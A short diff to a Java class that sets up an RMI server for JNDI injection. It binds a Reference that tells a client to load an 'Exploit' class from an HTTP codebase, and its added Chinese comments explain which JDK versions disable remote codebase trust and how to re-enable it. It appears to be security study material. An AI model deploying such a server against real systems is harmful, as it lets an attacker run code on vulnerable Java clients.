@@ -8,6 +8,10 @@ import java.rmi.registry.Registry;
 /**
  * JNDI + RMI 攻击利用
  * @poc rmi:127.0.0.0:1099/Object
+ *
+ * JDK 6u132、7u122、8u113 开始 com.sun.jndi.rmi.object.trustURLCodebase 默认值为false。
+ * 运行时需加入参数 -D com.sun.jndi.rmi.object.trustURLCodebase=true 。
+ * 因为如果 JDK 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 RMI 代码。
  */
 public class JNDIRmiServer {
     public static void main(String[] args) throws Exception {
@@ -25,7 +29,7 @@ public class JNDIRmiServer {
          *      参数2：classFactory – 加载的class中需要实例化类的名称
          *      参数3：classFactoryLocation – 提供classes数据的地址可以是file/ftp/http协议
          */
-        Reference reference = new Reference("Exploit", "Exploit","http://127.0.0.1:8000");
+        Reference reference = new Reference("Exploit", "Exploit","http://127.0.0.1:65500");
 
         // 将 rmi 服务与 Reference 进行绑定，提供远程服务器上的对象为客户端使用；
         initialContext.bind("rmi:127.0.0.1:Object", reference);
